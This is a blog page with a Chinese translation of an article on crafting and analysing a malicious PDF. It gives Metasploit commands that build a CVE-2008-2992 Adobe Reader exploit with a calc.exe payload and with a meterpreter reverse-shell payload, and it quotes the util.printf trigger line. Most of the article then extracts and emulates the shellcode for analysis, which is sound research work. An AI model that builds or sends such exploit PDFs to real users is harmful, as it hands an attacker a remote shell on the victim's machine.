@@ -1,0 +1,976 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Translation,PDF," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Cytosineの有被小窝~" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="原文地址：https://www.adlice.com/infected-pdf-extract-payload/  使用受感染的PDF一直是感染用户的最佳方式，因为这种文档格式非常常见，几乎每个人都使用它。此外，存在许多利用Acrobat Reader漏洞的方法，它是发布恶意软件的非常隐秘和优雅的方式。 在本文中，我将向您展示，使用自定义shellcode制作恶意PDF并触发漏洞以执行paylo">
+<meta name="keywords" content="Translation,PDF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[翻译]如何从恶意PDF中提取payload?">
+<meta property="og:url" content="https://lovegood.github.io/2018/07/30/translation-infected-pdf-extract-payload/index.html">
+<meta property="og:site_name" content="Cytosineの有被小窝~">
+<meta property="og:description" content="原文地址：https://www.adlice.com/infected-pdf-extract-payload/  使用受感染的PDF一直是感染用户的最佳方式，因为这种文档格式非常常见，几乎每个人都使用它。此外，存在许多利用Acrobat Reader漏洞的方法，它是发布恶意软件的非常隐秘和优雅的方式。 在本文中，我将向您展示，使用自定义shellcode制作恶意PDF并触发漏洞以执行paylo">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://www.adlice.com/wp-content/uploads/2016/06/Capture12-1152x576.png">
+<meta property="og:image" content="https://www.adlice.com/wp-content/uploads/2016/06/Capture6-2.png">
+<meta property="og:image" content="https://www.adlice.com/wp-content/uploads/2016/06/Capture7-1.png">
+<meta property="og:image" content="https://www.adlice.com/wp-content/uploads/2016/06/Capture8-1.png">
+<meta property="og:image" content="https://www.adlice.com/wp-content/uploads/2016/06/Capture9.png">
+<meta property="og:image" content="https://www.adlice.com/wp-content/uploads/2016/06/Capture10.png">
+<meta property="og:image" content="https://www.adlice.com/wp-content/uploads/2016/06/Capture11.png">
+<meta property="og:image" content="https://www.adlice.com/wp-content/uploads/2016/06/Capture12.png">
+<meta property="og:image" content="https://www.adlice.com/wp-content/uploads/2016/06/Capture13.png">
+<meta property="og:image" content="https://www.adlice.com/wp-content/uploads/2016/06/Capture14.png">
+<meta property="og:updated_time" content="2018-08-07T03:25:36.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="[翻译]如何从恶意PDF中提取payload?">
+<meta name="twitter:description" content="原文地址：https://www.adlice.com/infected-pdf-extract-payload/  使用受感染的PDF一直是感染用户的最佳方式，因为这种文档格式非常常见，几乎每个人都使用它。此外，存在许多利用Acrobat Reader漏洞的方法，它是发布恶意软件的非常隐秘和优雅的方式。 在本文中，我将向您展示，使用自定义shellcode制作恶意PDF并触发漏洞以执行paylo">
+<meta name="twitter:image" content="https://www.adlice.com/wp-content/uploads/2016/06/Capture12-1152x576.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://lovegood.github.io/2018/07/30/translation-infected-pdf-extract-payload/"/>
+
+
+
+
+
+  <title>[翻译]如何从恶意PDF中提取payload? | Cytosineの有被小窝~</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Cytosineの有被小窝~</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">悟已往之不谏，知来者之可追。</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+            cd ~
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+            uname -a
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+            ls -al post
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://lovegood.github.io/2018/07/30/translation-infected-pdf-extract-payload/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Cytosine">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.webp">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Cytosineの有被小窝~">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">[翻译]如何从恶意PDF中提取payload?</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-30T11:12:47+08:00">
+                2018-07-30
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>原文地址：<a href="https://www.adlice.com/infected-pdf-extract-payload/" target="_blank" rel="external">https://www.adlice.com/infected-pdf-extract-payload/</a></p>
+<p><img src="https://www.adlice.com/wp-content/uploads/2016/06/Capture12-1152x576.png" alt=""></p>
+<p><strong>使用受感染的PDF一直是感染用户的最佳方式</strong>，因为这种文档格式非常常见，几乎每个人都使用它。此外，存在许多<strong>利用Acrobat Reader漏洞</strong>的方法，它是发布恶意软件的非常隐秘和优雅的方式。</p>
+<p>在本文中，我将向您展示，使用自定义shellcode制作恶意PDF并触发漏洞以执行payload是多么容易。<strong>我们还将分析恶意PDF</strong>以了解payload的存储方式以及如何提取它。</p>
+<p><strong>本文仅供研究之用</strong>，不要做坏事！</p>
+<h1 id="PDF格式"><a href="#PDF格式" class="headerlink" title="PDF格式"></a>PDF格式</h1><p><strong>PDF是面向对象的格式，由Adobe定义</strong>。此格式描述了文档组织，并保留了文档所需的依赖关系（字体，图像……）。这些对象作为流存储在文档中，并且大部分时间被编码或压缩。以下是经典PDF文档的概述。<a href="http://partners.adobe.com/public/developer/tips/topic_tip31.html" target="_blank" rel="external">有关更多信息，请阅读Adobe的规范。</a></p>
+<p><img src="https://www.adlice.com/wp-content/uploads/2016/06/Capture6-2.png" alt=""></p>
+<h1 id="创建恶意PDF"><a href="#创建恶意PDF" class="headerlink" title="创建恶意PDF"></a>创建恶意PDF</h1><p><strong>我们将使用<a href="http://www.metasploit.com/" target="_blank" rel="external">metasploit</a>创建一个伪造的PDF</strong>，其中包含一个漏洞exp，以及一个自定义的payload（要执行的代码）。<strong>该漏洞利用的目标是特定版本的Adobe Reader</strong>，因此我们需要进行一些考古并找到一个古老的Reader版本（感谢<a href="http://www.oldapps.com/）在目标机器上安装。" target="_blank" rel="external">http://www.oldapps.com/）在目标机器上安装。</a></p>
+<p>所以，首先，让我们制作这个PDF。<strong>我们将制作一个只在机器上打开计算器</strong>（calc.exe）的恶意PDF，仅用于演示。<strong>打开metasploit控制台</strong>（本文未涉及安装metasploit）并键入：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">use exploit/windows/fileformat/adobe_utilprintf</div><div class="line">set FILENAME malicious.pdf</div><div class="line">set PAYLOAD windows/exec</div><div class="line">set CMD calc.exe</div><div class="line">show options</div><div class="line">exploit</div></pre></td></tr></table></figure>
+<p>看起来像这样：</p>
+<p><img src="https://www.adlice.com/wp-content/uploads/2016/06/Capture7-1.png" alt=""></p>
+<p><strong>将刚创建的文件</strong>（此处为/home/osboxes/.msf4/local/malicious.pdf）复制到共享驱动器上。您需要把它提供给目标机器。</p>
+<h1 id="恶意PDF执行"><a href="#恶意PDF执行" class="headerlink" title="恶意PDF执行"></a>恶意PDF执行</h1><p><strong>在目标计算机上，下载并安装易受攻击的Adobe Reader版本</strong>（metasploit告诉我们它应该小于8.1.2）。我选择<a href="http://www.oldapps.com/adobe_reader.php?old_adobe=16" target="_blank" rel="external">安装8.1.1版本</a>。</p>
+<p>安装后，<strong>执行malicious.pdf文件</strong>。您应该看到<strong>从Adobe Reader进程生成的计算器</strong>。这就是漏洞利用。</p>
+<p><img src="https://www.adlice.com/wp-content/uploads/2016/06/Capture8-1.png" alt=""></p>
+<p><strong>我已经完成了另一个PDF，但稍微改变了payload</strong>，只是为了好玩：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">set PAYLOAD windows/meterpreter/reverse_tcp</div><div class="line">set LHOST 192.168.1.29</div><div class="line">set LPORT 4455</div></pre></td></tr></table></figure>
+<p>这是结果。 <strong>Adobe Reader现在有一个后门</strong>（反向shell）监听命令。</p>
+<p><img src="https://www.adlice.com/wp-content/uploads/2016/06/Capture9.png" alt=""></p>
+<h1 id="恶意PDF分析"><a href="#恶意PDF分析" class="headerlink" title="恶意PDF分析"></a>恶意PDF分析</h1><p>玩够了！ 让我们看看<strong>恶意PDF中的内容</strong>，让我们尝试<strong>提取恶意payload</strong>（我们仍然使用calc.exe PDF）。</p>
+<p>首先，我们需要一个名为<a href="http://sandsprite.com/blogs/index.php?uid=7&amp;pid=57" target="_blank" rel="external">PDF Stream Dumper</a>的工具，所以请下载它。使用它加载恶意PDF，并花些时间熟悉该工具。</p>
+<p><img src="https://www.adlice.com/wp-content/uploads/2016/06/Capture10.png" alt=""></p>
+<p>我们可以使用该工具的<strong>“Exploit Scan”菜单</strong>来<strong>检测PDF中是否有exp</strong>。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Exploit CVE-2008-2992 Date:11.4.08 v8.1.2 - util.printf - found in stream: 6</div></pre></td></tr></table></figure>
+<p>实际上，<strong>在流6中隐藏了一个漏洞</strong>（捕获中的蓝色漏洞）。</p>
+<p>但是让我们从头开始：在PDF中搜索漏洞时，<strong>我们大多数时候会遇到由Javascript代码创建的<a href="https://en.wikipedia.org/wiki/Heap_spraying" target="_blank" rel="external">堆喷</a></strong>。该堆喷用于<strong>推动堆上的payload，一旦漏洞被触发就可以执行</strong>。</p>
+<p><strong>如果您打开流1</strong>，您可以看到：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/Type/Catalog/Outlines 2 0 R/Pages 3 0 R/OpenAction 5 0 R</div></pre></td></tr></table></figure>
+<p>我们可以<strong>在流5上转换为OpenAction</strong>。让我们转到第5流：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/Type/Action/S/JavaScript/JS 6 0 R</div></pre></td></tr></table></figure>
+<p>其中说要<strong>执行位于流6中的Javascript</strong>。此流显示简单的Javascript，是时候打开<strong>“Javascript_UI”菜单</strong>了。我们立即识别出一个十六进制编码的大字符串，并将其推入变量以进行堆喷。<strong>这是我们的payload</strong>：</p>
+<p><img src="https://www.adlice.com/wp-content/uploads/2016/06/Capture11.png" alt=""></p>
+<p>幸运的是，我们有工具来操纵它，并了解它的作用。<strong>选择payload</strong>（引号之间的部分），然后<strong>打开“Shellcode_analysis”菜单</strong>。 然后选择<strong>“scDbg - LibEmu Emulation”</strong>。您将获得一个新窗口<strong>将shellcode解码为字节</strong>（您甚至可以将其保存到文件中）：</p>
+<p><img src="https://www.adlice.com/wp-content/uploads/2016/06/Capture12.png" alt=""></p>
+<p><strong>LibEmu是一个能够模拟处理器的库</strong>，它提供了<strong>有关汇编代码尝试执行的操作的信息</strong>。只需点击<strong>“启动”按钮</strong>，您就会明白：</p>
+<p><img src="https://www.adlice.com/wp-content/uploads/2016/06/Capture13.png" alt=""></p>
+<p>在这里，我们可以清楚地看到<strong>shellcode只会打开一个calc.exe窗口并退出。 让我们重新对其他恶意PDF（反向shell）进行相同的分析</strong>：</p>
+<p><img src="https://www.adlice.com/wp-content/uploads/2016/06/Capture14.png" alt=""></p>
+<p>呃，自我解释吧？ <strong>Shellcode正在加载操作套接字所需的库</strong>（ws2_32.dll），<strong>并尝试连接回C＆C</strong>。</p>
+<p>我没有告诉漏洞本身，<strong>它位于javascript代码的末尾</strong>（如Exploit搜索所述，“util.printf - 在stream：6中找到”）。<strong>它正在利用printf函数上的缓冲区溢</strong>出来执行任意代码（这里是我们的堆喷射shellcode）。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">util.printf(&quot;%45000.45000f&quot;, 0);</div></pre></td></tr></table></figure>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
+<li><a href="http://www.sans.org/reading-room/whitepapers/malicious/owned-malicious-pdf-analysis-33443" target="_blank" rel="external">http://www.sans.org/reading-room/whitepapers/malicious/owned-malicious-pdf-analysis-33443</a></li>
+<li><a href="http://www.oldapps.com/adobe_reader.php" target="_blank" rel="external">http://www.oldapps.com/adobe_reader.php</a></li>
+<li><a href="http://contagiodump.blogspot.fr/2010/08/malicious-documents-archive-for.html" target="_blank" rel="external">http://contagiodump.blogspot.fr/2010/08/malicious-documents-archive-for.html</a></li>
+<li><a href="http://contagiodump.blogspot.fr/2013/03/16800-clean-and-11960-malicious-files.html" target="_blank" rel="external">http://contagiodump.blogspot.fr/2013/03/16800-clean-and-11960-malicious-files.html</a></li>
+<li><a href="http://eternal-todo.com/blog/cve-2011-2462-exploit-analysis-peepdf" target="_blank" rel="external">http://eternal-todo.com/blog/cve-2011-2462-exploit-analysis-peepdf</a></li>
+<li><a href="http://blog.9bplus.com/analyzing-cve-2011-2462/" target="_blank" rel="external">http://blog.9bplus.com/analyzing-cve-2011-2462/</a></li>
+<li><a href="https://www.fireeye.com/blog/threat-research/2012/07/analysis-of-a-different-pdf-malware.html" target="_blank" rel="external">https://www.fireeye.com/blog/threat-research/2012/07/analysis-of-a-different-pdf-malware.html</a></li>
+<li><a href="http://resources.infosecinstitute.com/analyzing-malicious-pdf/" target="_blank" rel="external">http://resources.infosecinstitute.com/analyzing-malicious-pdf/</a></li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>窝很可爱，请给窝钱</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>赞赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechat.png" alt="Cytosine 微信支付"/>
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/alipay.jpg" alt="Cytosine 支付宝"/>
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Translation/" rel="tag"># Translation</a>
+          
+            <a href="/tags/PDF/" rel="tag"># PDF</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/05/27/writeup-2018ISCC2018/" rel="next" title="ISCC2018部分WriteUp">
+                <i class="fa fa-chevron-left"></i> ISCC2018部分WriteUp
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/08/08/note-upload-ichunqiu/" rel="prev" title="文件上传简要笔记">
+                文件上传简要笔记 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.webp"
+                alt="Cytosine" />
+            
+              <p class="site-author-name" itemprop="name">Cytosine</p>
+              <p class="site-description motion-element" itemprop="description">悟已往之不谏，知来者之可追。</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">32</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">49</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          <div class="links-of-author motion-element">
+            
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/Lovegood" target="_blank" title="GitHub">
+                    GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="https://www.zhihu.com/people/CytosineLovegood/activities" target="_blank" title="知乎">
+                    知乎</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="https://zhuanlan.zhihu.com/dashijian" target="_blank" title="安全大事件">
+                    安全大事件</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="https://xuptsec.github.io/" target="_blank" title="XUPTSEC-blog">
+                    XUPTSEC-blog</a>
+                </span>
+              
+            
+          </div>
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                from dalao import
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://exp101t.blogspot.com/" title="Murasaki" target="_blank">Murasaki</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://pcat.cnblogs.com/" title="pcat" target="_blank">pcat</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://flygon.net/" title="飞龙" target="_blank">飞龙</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://ju5tw4nty0u.top/" title="ju5tw4nty0u" target="_blank">ju5tw4nty0u</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://darkwing.moe/" title="暗羽" target="_blank">暗羽</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://webdog.ml/" title="grt1st" target="_blank">grt1st</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.k0rz3n.com/" title="K0rz3n" target="_blank">K0rz3n</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://skysec.top/" title="一叶飘零" target="_blank">一叶飘零</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.lovei.org/" title="腹黑" target="_blank">腹黑</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://sec2hack.com/" title="Wfox" target="_blank">Wfox</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.codemonster.cn/" title="Xishir" target="_blank">Xishir</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://eternalsakura13.com/" title="Sakura" target="_blank">Sakura</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://math1as.com/" title="Math1as" target="_blank">Math1as</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://blog.thecosmos.cn/" title="Cosmos" target="_blank">Cosmos</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.csdn.net/whklhhhh" title="奈沙夜影" target="_blank">奈沙夜影</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://blog.csdn.net/PeterZ1997/" title="PeterZ" target="_blank">PeterZ</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.virzz.com/" title="Virink" target="_blank">Virink</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.changwei.me/" title="昌维" target="_blank">昌维</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://white.xmutsec.com" title="White" target="_blank">White</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://cismon.net/" title="CismonX" target="_blank">CismonX</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.lsafe.org/" title="lixin" target="_blank">lixin</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://wzsite.cn/" title="Wz" target="_blank">Wz</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.blogsir.com.cn/" title="江sir" target="_blank">江sir</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://greyd0g.github.io/" title="greyd0g" target="_blank">greyd0g</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://brucetg.github.io/" title="Brucetg" target="_blank">Brucetg</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.get1t.cn/" title="FraMeQ" target="_blank">FraMeQ</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.smallflower.xin/" title="小花" target="_blank">小花</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://iosmosis.github.io/" title="iosmosis" target="_blank">iosmosis</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://processor.pub/" title="Processor" target="_blank">Processor</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.lmxspace.com/" title="l1nk3r" target="_blank">l1nk3r</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.evi1s.com/index.php/links.html" title="Map1e" target="_blank">Map1e</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://pvp.im/" title="清枫" target="_blank">清枫</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.itfire.cn/" title="仓鼠" target="_blank">仓鼠</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.sk15.net/" title="一苇" target="_blank">一苇</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.t1h2ua.cn/" title="T1h2ua" target="_blank">T1h2ua</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://qtfreet.com/" title="qtfreet00" target="_blank">qtfreet00</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://tea9.xyz/" title="茶茶" target="_blank">茶茶</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#PDF格式"><span class="nav-number">1.</span> <span class="nav-text">PDF格式</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#创建恶意PDF"><span class="nav-number">2.</span> <span class="nav-text">创建恶意PDF</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#恶意PDF执行"><span class="nav-number">3.</span> <span class="nav-text">恶意PDF执行</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#恶意PDF分析"><span class="nav-number">4.</span> <span class="nav-text">恶意PDF分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考"><span class="nav-number">5.</span> <span class="nav-text">参考</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2017 &mdash; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Cytosine</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a></div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
